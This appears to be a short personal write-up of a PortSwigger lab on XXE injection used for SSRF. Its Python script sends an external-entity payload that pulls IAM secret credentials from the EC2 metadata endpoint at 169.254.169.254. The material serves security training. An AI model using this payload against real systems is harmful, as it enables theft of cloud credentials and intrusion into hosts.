# XXE SSRF Portswigger

## 2023-12-30, Joakim Oscarsson

### Problem description
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

### Misc
By including the <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> and querying &xxe inside a tag we get the response "Invalid product ID: <leaked information>" which we can use to dig out secret information.

### Solution

```python

import requests

url = "https://0abb00740473052a81b345da00f20061.web-security-academy.net/product/stock"

xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>'''

response = requests.post(url, data=xml)

print(response.text)

```